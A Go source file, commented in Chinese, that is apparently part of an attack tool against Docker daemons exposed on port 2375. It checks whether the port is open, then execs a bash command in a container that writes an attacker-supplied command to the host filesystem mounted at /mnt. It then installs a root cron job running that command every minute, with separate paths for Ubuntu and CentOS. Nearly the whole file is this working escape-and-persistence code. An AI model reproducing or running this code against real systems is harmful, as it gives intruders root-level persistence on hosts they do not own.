package main

import (
	"context"
	"fmt"
	"github.com/docker/docker/api/types"
	"github.com/docker/docker/client"
)


//进入容器执行命令设置计划任务
func ExecToContainerCron(containerID string,cli *client.Client,croncmd string){
	// 创建上下文
	ctx := context.Background()

	//计划任务的命令，先判断是ubuntu还是centos构架然后再设置计划任务
	resCron :="if chroot /mnt cat /etc/lsb-release | grep -qi \"ubuntu\"; then " + "echo \"" + croncmd + "\" > /mnt/tmp/test1.sh && echo \"*/1 * * * * bash /tmp/test1.sh\" >> /mnt/var/spool/cron/crontabs/root && chmod 600 /mnt/var/spool/cron/crontabs/root" +  "; elif chroot /mnt cat /etc/redhat-release | grep -qi \"centos\"; then " + "echo \"" + croncmd  + "\" >/mnt/tmp/test1.sh && echo \"*/1 * * * * root bash /tmp/test1.sh\" >> /mnt/etc/crontab" + "; fi\n"
	//fmt.Println(resCron)
	cmd := []string{"/bin/bash", "-c", resCron }

	resp , err := cli.ContainerExecCreate(ctx, containerID, types.ExecConfig{
		Cmd: cmd,
	})
	if err != nil {
		fmt.Println(err)
	}

	err = cli.ContainerExecStart(ctx, resp.ID, types.ExecStartCheck{})
	if err != nil {
		fmt.Println(err)
	}
}

func AttackToSetCron(ip string,CronCommand string,containername string){
	if(Port2375(ip)){
		fmt.Printf("the %s port open!!!\n",ip)
		cli :=CreateDockerCli(ip)
		CreateContainerSetCron(cli,CronCommand,containername)
	}else {
		fmt.Printf("the %s port closed!!!\n",ip)
	}
}